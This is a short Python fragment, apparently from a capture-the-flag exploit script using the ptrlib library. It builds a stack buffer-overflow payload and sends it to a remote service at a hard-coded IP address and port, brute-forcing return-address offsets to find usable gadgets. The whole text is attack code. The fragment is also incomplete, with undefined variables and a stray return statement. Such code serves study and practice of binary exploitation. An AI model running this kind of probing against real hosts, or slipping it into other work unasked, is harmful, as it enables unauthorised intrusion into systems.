from ptrlib import *



if (base + offset) % 0x100 == 0:
    dump("trying: " + hex(base + offset), "warning")
payload = b'A' * 40
payload += p64(base + offset)
payload += p64(addr_main) * 8
sock = Socket("34.92.37.22", 10000)
sock.recvuntil("pwn!\n")
sock.send(payload)
l = sock.recv(timeout=1.0)
if l is not None:
    dump("Safe gadget at {}: {}".format(hex(base + offset), l), "warning")
sock.close()
return
